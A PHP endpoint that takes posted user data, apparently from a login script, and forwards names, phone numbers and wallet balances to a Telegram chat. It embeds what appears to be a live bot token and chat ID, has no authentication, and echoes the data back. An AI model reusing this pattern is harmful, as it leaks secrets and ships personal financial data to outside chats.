<?php

ini_set('display_errors',1);
error_reporting(E_ALL);


$token = "8677498486:AAFyHSstosvrtaBJwj-_eV25U3eWKkbKwOo";
$chat  = "8940716704";


// GET DATA FROM LOGIN PHP
$raw = file_get_contents("php://input");


// IF NOTHING RECEIVED, SEND TEST MESSAGE
if(!$raw){

    $message = "🔥 TEST FROM RENDER ".date("Y-m-d H:i:s");

}else{


    $data = json_decode($raw,true);


    $message = "💰 SHJEEEE WALLET REPORT\n\n";


    if(isset($data['users'])){


        foreach($data['users'] as $user){


            $message .= 
            "👤 ".$user['name']."\n".
            "📱 ".$user['phone']."\n".
            "💵 UGX ".$user['wallet']."\n".
            "-------------------\n";


        }


        $message .= "\n🔥 TOTAL WALLET\n";
        $message .= "UGX ".$data['total_wallet'];


    }else{

        $message .= $raw;

    }

}



// SEND TO TELEGRAM

$url = "https://api.telegram.org/bot".$token."/sendMessage";


$post = [
    "chat_id"=>$chat,
    "text"=>$message
];


$ch = curl_init($url);


curl_setopt_array($ch,[

    CURLOPT_POST=>true,

    CURLOPT_POSTFIELDS=>$post,

    CURLOPT_RETURNTRANSFER=>true

]);


$result = curl_exec($ch);


$error = curl_error($ch);


curl_close($ch);



echo "<pre>";

echo "MESSAGE SENT:\n\n";

echo $message;


echo "\n\nTELEGRAM RESPONSE:\n";

print_r($result);


echo "\n\nCURL ERROR:\n";

print_r($error);


echo "</pre>";

?>
